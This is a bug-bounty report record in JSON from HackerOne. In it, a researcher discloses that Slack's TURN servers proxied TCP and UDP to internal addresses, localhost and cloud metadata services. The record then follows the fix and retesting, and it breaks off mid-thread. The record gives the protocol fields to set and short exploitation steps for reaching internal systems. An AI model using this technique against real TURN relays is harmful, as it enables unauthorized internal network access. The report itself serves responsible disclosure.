{
  "id": 333419,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzM0MTk=",
  "url": "https://hackerone.com/reports/333419",
  "title": "TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-04-04T14:05:47.045Z",
  "submitted_at": "2018-04-04T14:05:47.045Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "sandrogauci",
    "url": "/sandrogauci",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 69,
    "url": "https://hackerone.com/slack",
    "handle": "slack",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Slack",
      "twitter_handle": "slackhq",
      "website": "https://slack.com",
      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-03-12T00:15:42.616Z",
  "bug_reporter_agreed_on_going_public_at": "2020-03-04T15:29:16.799Z",
  "team_member_agreed_on_going_public_at": "2020-03-12T00:15:42.520Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The TURN servers used by Slack allow TCP connections and UDP packets to be proxied to the internal network. This gives an attacker the ability to scan and interact with internal systems.\n\nThe attacker may proxy TCP connections to the internal network by setting the `XOR-PEER-ADDRESS` of the TURN connect message (method `0x000A`, <https://tools.ietf.org/html/rfc6062#section-4.3>) to a private IPv4 address.\n\nUDP packets may be proxied by setting the `XOR-PEER-ADDRESS` to a private IP in the TURN send message indication (method `0x0006`, <https://tools.ietf.org/html/rfc5766#section-10>).\n\nPlease check the attached report for additional details.\n\n## Impact\n\nBy abusing this feature an attacker will be able to read and potentially modify sensitive information in Slack's internal infrastructure. Typically, this security vulnerability has at least the same impact as an SSRF. However it is considered more useful from an attacker's point of view since attacks are not restricted to HTTP.\n\nThe hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**Can internal services be reached bypassing network access control?**\nYes\n\n**What internal services were accessible?**\nMetadata, localhost, network services on the `10.0.0.0/8`\n\n**Security Impact**\nBy abusing this feature an attacker will be able to read and potentially modify sensitive information in Slack's internal infrastructure. Typically, this security vulnerability has at least the same impact as an SSRF. However it is considered more useful from an attacker's point of view since attacks are not restricted to HTTP.\n\nNote: vulnerability is not SSRF but open TURN proxy - this was the closest I could choose.\n\n",
  "bounty_amount": "3500.0",
  "formatted_bounty": "$3,500",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 281909,
      "file_name": "turn_tcp_proxy_response.pcapng",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/281/909/12b59b02efea4597e38df4cef8e1e5fbed5626b8/turn_tcp_proxy_response.pcapng?response-content-disposition=attachment%3B%20filename%3D%22turn_tcp_proxy_response.pcapng%22%3B%20filename%2A%3DUTF-8%27%27turn_tcp_proxy_response.pcapng&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4449f4c0978737d465a73d2ebe263a59b5ee80421db72e8cdba73226df921c74",
      "file_size": 25836,
      "type": "application/octet-stream",
      "moderated": null
    },
    {
      "id": 281910,
      "file_name": "report.md",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/281/910/a779d7e33466d343711ad1563838bd16159f961a/report.md?response-content-disposition=attachment%3B%20filename%3D%22report.md%22%3B%20filename%2A%3DUTF-8%27%27report.md&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e7d0ea9c3091980ca07b853d0c603f5de871b231301f0e771f50e8d88e52b625",
      "file_size": 8865,
      "type": "text/html",
      "moderated": null
    },
    {
      "id": 281911,
      "file_name": "turn_udp(53)_proxy_response.pcapng",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/281/911/a9efd5adface6b8b48ecf74e21e7087cbd66b999/turn_udp%2853%29_proxy_response.pcapng?response-content-disposition=attachment%3B%20filename%3D%22turn_udp%252853%2529_proxy_response.pcapng%22%3B%20filename%2A%3DUTF-8%27%27turn_udp%252853%2529_proxy_response.pcapng&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fc96c65a5f6bacf53bbe49daefce365f72d4d8b4a095e66f33086148246b5428",
      "file_size": 1784,
      "type": "application/octet-stream",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-04-03T15:29:16.859Z",
  "allow_singular_disclosure_after": -109526562.66884674,
  "singular_disclosure_allowed": true,
  "vote_count": 312,
  "voters": [
    "sandrogauci",
    "urinaori",
    "bleg",
    "acut3",
    "rapiddns",
    "sebd",
    "jeti",
    "a_d_a_m",
    "hackerontwowheels",
    "n0x496n",
    "and 302 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 2574825,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you for your report.\n\nWe're looking into this and will keep you updated when we have additional information.",
      "automated_response": false,
      "created_at": "2018-04-06T21:46:13.540Z",
      "updated_at": "2018-04-06T21:46:13.540Z",
      "actor": {
        "username": "bugtriage-josh",
        "cleared": false,
        "verified": false,
        "url": "/bugtriage-josh",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2592242,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "@sandrogauci -- Thank you again for your report.  \n\nIn addition to your ultimate findings, which we appreciate you providing, would it be possible for you to demonstrate the attack you outlined itself?  A video showing exactly what tools you used, and what precise steps you took, would help us to follow your instructions and replicate the attack you describe.  This would greatly help us to further evaluate your report.",
      "automated_response": false,
      "created_at": "2018-04-11T18:56:38.372Z",
      "updated_at": "2018-04-11T18:56:38.372Z",
      "actor": {
        "username": "bugtriage-josh",
        "cleared": false,
        "verified": false,
        "url": "/bugtriage-josh",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2592348,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Hi Josh -  will get a video recorded showing the attack in progress. I'll see what I can do in terms of providing further details to help you reproduce the issue since we're not currently distributing our code. \n\nThe step by step instructions that we provide in the report (referring to report.md) and the pcaps are meant help developers familiar with the STUN and TURN protocols to reproduce the issues. Do indicate what sort of information would help you so that we can cater for your needs.",
      "automated_response": false,
      "created_at": "2018-04-11T19:20:21.611Z",
      "updated_at": "2018-04-11T19:20:21.611Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2598397,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Triaged! Our team is looking into this. Any help to provide video or further details to reproduce the issue will be appreciated.",
      "automated_response": false,
      "created_at": "2018-04-12T18:32:30.660Z",
      "updated_at": "2018-04-12T18:32:30.660Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2598669,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Steps to exploit the vulnerability:\n\n1. While passing through Burp as a proxy, try to make a call to some other Slack user\n2. Note the HTTP response to the request at `/api/screenhero.rooms.create`\n3. Set the TURN details (hostname and credentials) in the exploitation tool\n4. Start the exploitation tool to proxy HTTP traffic over TURN\n5. Access internal systems such as the meta-data service, localhost services or valid internal IP addresses\n\nVideo showing exploitation attached. Do let me know if this is sufficient. ",
      "automated_response": false,
      "created_at": "2018-04-12T19:46:26.293Z",
      "updated_at": "2018-04-12T19:46:26.293Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 285048,
          "filename": "2018-04-12_16_57_19.913343.mkv",
          "type": "video/x-matroska",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/285/048/1de79aebeaff9cdd51f453669b71a1bfa0ae7fb1/2018-04-12_16_57_19.913343.mkv?response-content-disposition=attachment%3B%20filename%3D%222018-04-12_16_57_19.913343.mkv%22%3B%20filename%2A%3DUTF-8%27%272018-04-12_16_57_19.913343.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c6fb31b6ef5f3d1c1235d23e2562b9b65bc14bc597d7dd3da16ff7be8f22086f"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2599242,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci Thanks for the additional information and POC video. We are looking more into this. We will keep you updated when we have additional information.",
      "automated_response": false,
      "created_at": "2018-04-12T22:27:03.025Z",
      "updated_at": "2018-04-12T22:27:03.025Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2599311,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci Our team just make some changes and spin up a dev instance for you to re-test this vulnerability. You can try and run you stunner tool again to this particular server `slack-calls-orca-dev-iad-3kjx.slack-core.com`. In your `slack.toml` config file, please add credentials the same way where you get it from https://<team>.slack.com/api/screenhero.rooms.create. Can you please confirm if this issue is fixed on this env?",
      "automated_response": false,
      "created_at": "2018-04-12T23:08:21.636Z",
      "updated_at": "2018-04-12T23:08:21.636Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2599809,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@fyunaz Thanks for the update. I have done one test which indicated that TCP proxying has been now disabled - which would address the issue with regards to TCP. However as I was preparing for a second test to check for UDP, I noticed that the host seemed to have been shutdown and its DNS entry removed. \n\nIf you switch the system back on, I'm happy to do further tests to ensure that this would be fixed correctly on UDP as well.",
      "automated_response": false,
      "created_at": "2018-04-13T04:44:50.608Z",
      "updated_at": "2018-04-13T04:44:50.608Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2599858,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci Sorry, it looks like the host was deprovision as part of our daily rebuild cycle in dev. We spin up a new instance for you to test `slack-calls-orca-dev-iad-ev4y.slack-core.com`. Can you please confirm both issues were fixed on this instance?",
      "automated_response": false,
      "created_at": "2018-04-13T05:22:06.511Z",
      "updated_at": "2018-04-13T05:22:06.511Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2601594,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@fyunaz No worries - thanks for providing me with another one. I verified that:\n\n1. TCP relaying is disabled now\n2. UDP is enabled (as it should be) and disabling most internal addresses except the following:\n       - `0.0.0.0`\n       - `100.64.0.0`\n       - `224.0.0.1`\n\nThe most concerning is the `0.0.0.0` which still seems to allow localhost. I suggest that the relevant ranges on those special addresses are blocked. As mentioned in the original report, these are IP ranges in RFC6890. ",
      "automated_response": false,
      "created_at": "2018-04-13T09:28:33.911Z",
      "updated_at": "2018-04-13T09:28:33.911Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2603800,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci Thanks for your feedback. I reached out to the team and we added a patch to the same instance `slack-calls-orca-dev-iad-ev4y.slack-core.com`. Can you please retest and confirm the issues is fixed on this instance?",
      "automated_response": false,
      "created_at": "2018-04-13T15:22:12.490Z",
      "updated_at": "2018-04-13T15:22:12.490Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2606216,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@fyunaz to me it looks like all TURN traffic is now being blocked - which, apart from solving the security problem, would block legitimate usage as well (not good). \n\nWas the live system also updated with the new rules? Because it seems that I am no longer able to reproduce the issue on the live - which I was doing to make sure my tools are actually behaving as I expect them to.\n",
      "automated_response": false,
      "created_at": "2018-04-14T05:02:15.032Z",
      "updated_at": "2018-04-14T05:02:15.032Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2606289,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci Thanks for confirming the patch work. Yes, we did start to roll out the patch to prod. We are still investigating this issue and we will follow up again with you next week.\n\nHave a great weekend!",
      "automated_response": false,
      "created_at": "2018-04-14T06:36:13.296Z",
      "updated_at": "2018-04-14T06:36:13.296Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2629805,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
